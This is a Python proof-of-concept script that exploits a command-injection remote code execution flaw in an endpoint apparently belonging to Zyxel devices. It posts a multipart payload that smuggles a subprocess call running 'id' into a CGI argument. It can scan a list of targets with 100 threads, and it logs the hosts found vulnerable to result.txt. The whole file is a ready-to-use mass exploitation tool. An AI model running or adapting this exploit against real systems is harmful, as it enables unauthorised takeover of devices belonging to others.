import requests,argparse,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 ldwk", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=--------------------------0987654321", "Connection": "keep-alive"}
    data = "----------------------------0987654321\r\nContent-Disposition: form-data; name=\"c0\"\r\n\r\nstorage_ext_cgi CGIGetExtStoInfo None) and False or __import__(\"subprocess\").check_output(\"id\", shell=True)#\r\n----------------------------0987654321--\r\n"
    payload = "/cmd,/simZysh/register_main/setCookie"
    rsp1 = requests.get(url=target,verify=False)
    if rsp1.status_code == 200:
        rsp2 = requests.post(url=target+payload,data=data,headers=headers,verify=False)
        res = json.loads(rsp2.text)
        if res['errno0']==0 and res['errmsg0']=='OK':
            print(f'[+]{target}存在RCE漏洞')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在RCE漏洞')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()